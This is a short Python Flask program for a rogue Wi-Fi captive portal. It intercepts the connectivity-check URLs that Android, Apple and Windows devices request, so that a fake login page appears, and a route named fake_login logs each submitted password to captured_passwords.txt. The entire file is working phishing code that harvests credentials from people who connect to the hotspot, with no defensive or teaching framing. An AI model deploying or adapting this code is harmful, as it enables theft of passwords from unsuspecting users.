from flask import Flask, request, send_file
from datetime import datetime

app = Flask(__name__)

@app.route('/')
@app.route('/generate_204')  # Android
@app.route('/hotspot-detect.html')  # Apple
@app.route('/ncsi.txt')  # Windows
@app.route('/connecttest.txt')  # Windows 10+
@app.route('/<path:path>')
def catch_all(path=None):
    return send_file("templates/index.html"), 200

@app.route("/submit", methods=["POST"])
def fake_login():
    if request.method == "POST":
        password = request.form.get("password")
        with open("captured_passwords.txt", "a") as f:
            f.write(f"{datetime.now()} - {password}\n")
        return "<h3>Connecting... Please wait.</h3>"

if __name__ == "__main__":
    app.run(host="10.0.1.1", port=80)
